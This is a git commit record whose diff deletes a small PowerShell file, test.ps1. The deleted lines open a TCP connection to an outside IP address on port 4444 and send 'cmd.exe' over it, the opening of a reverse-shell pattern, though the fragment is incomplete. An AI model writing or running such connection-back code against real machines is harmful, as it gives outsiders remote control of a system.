543401c16ee9f14ab1ac3583f280aaa19326150e
M1K259 <87774553+Mika259@users.noreply.github.com>
2025-01-31 23:50:08 +0800

    Delete test.ps1

--- test.ps1
+++
@@ -1,6 +0,0 @@
-$client = New-Object System.Net.Sockets.TCPClient("100.83.30.72", 4444);
-$stream = $client.GetStream();
-$writer = New-Object System.IO.StreamWriter($stream);
-$writer.AutoFlush = $true;
-$command = "cmd.exe";
-$writer.WriteLine($command);
